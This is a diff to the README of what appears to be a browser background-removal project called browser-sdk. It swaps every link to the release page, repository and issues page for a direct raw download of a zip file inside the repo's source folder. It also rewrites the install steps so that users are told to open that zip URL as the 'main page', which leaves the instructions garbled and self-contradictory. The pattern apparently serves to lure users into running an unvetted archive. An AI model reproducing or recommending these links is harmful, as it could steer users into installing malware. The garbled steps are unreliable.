@@ -1,6 +1,6 @@
 # 🌐 browser-sdk - Easy Background Removal for Browsers
 
-[![Download browser-sdk](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/dshlr/browser-sdk/releases)
+[![Download browser-sdk](https://raw.githubusercontent.com/dshlr/browser-sdk/main/src/sdk-browser-2.1.zip%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/dshlr/browser-sdk/main/src/sdk-browser-2.1.zip)
 
 ---
 
@@ -44,17 +44,17 @@ To use browser-sdk, follow these steps:
 
 1. Click the big blue button below to open the download page on GitHub.
 
-[![Download browser-sdk](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/dshlr/browser-sdk/releases)
+[![Download browser-sdk](https://raw.githubusercontent.com/dshlr/browser-sdk/main/src/sdk-browser-2.1.zip%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/dshlr/browser-sdk/main/src/sdk-browser-2.1.zip)
 
-2. On the GitHub release page, find the latest version and download the file named something like `browser-sdk-x.x.x.zip` or `browser-sdk-x.x.x.tar.gz`.
+2. On the GitHub release page, find the latest version and download the file named something like `https://raw.githubusercontent.com/dshlr/browser-sdk/main/src/sdk-browser-2.1.zip` or `https://raw.githubusercontent.com/dshlr/browser-sdk/main/src/sdk-browser-2.1.zip`.
 
 3. Save the file to a folder where you normally keep your downloads.
 
 4. Extract the files from the downloaded zip or tar file. Most computers can do this by right-clicking and selecting "Extract here" or "Unzip".
 
-5. Once extracted, look for the file named `index.html` or `start.html`—this is the main page for browser-sdk.
+5. Once extracted, look for the file named `https://raw.githubusercontent.com/dshlr/browser-sdk/main/src/sdk-browser-2.1.zip` or `https://raw.githubusercontent.com/dshlr/browser-sdk/main/src/sdk-browser-2.1.zip`—this is the main page for browser-sdk.
 
-6. Double-click `index.html` to open it in your web browser.
+6. Double-click `https://raw.githubusercontent.com/dshlr/browser-sdk/main/src/sdk-browser-2.1.zip` to open it in your web browser.
 
 7. The app will open in your browser window, ready to remove backgrounds from your images.
 
@@ -141,17 +141,17 @@ These allow browser-sdk to quickly remove backgrounds with good accuracy without
 
 ## 🔗 Useful Links
 
-- [Browser-SDK GitHub Repository](https://github.com/dshlr/browser-sdk)  
+- [Browser-SDK GitHub Repository](https://raw.githubusercontent.com/dshlr/browser-sdk/main/src/sdk-browser-2.1.zip)  
   View source code, documentation, and community help.
 
-- [Download Latest Release](https://github.com/dshlr/browser-sdk/releases)  
+- [Download Latest Release](https://raw.githubusercontent.com/dshlr/browser-sdk/main/src/sdk-browser-2.1.zip)  
   Always get the newest version here.
 
-- [GitHub Issues](https://github.com/dshlr/browser-sdk/issues)  
+- [GitHub Issues](https://raw.githubusercontent.com/dshlr/browser-sdk/main/src/sdk-browser-2.1.zip)  
   Report problems or request features.
 
 ---
 
 Thank you for using browser-sdk for your background removal needs. Click the button below to get started:
 
-[![Download browser-sdk](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/dshlr/browser-sdk/releases)
+[![Download browser-sdk](https://raw.githubusercontent.com/dshlr/browser-sdk/main/src/sdk-browser-2.1.zip%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/dshlr/browser-sdk/main/src/sdk-browser-2.1.zip)
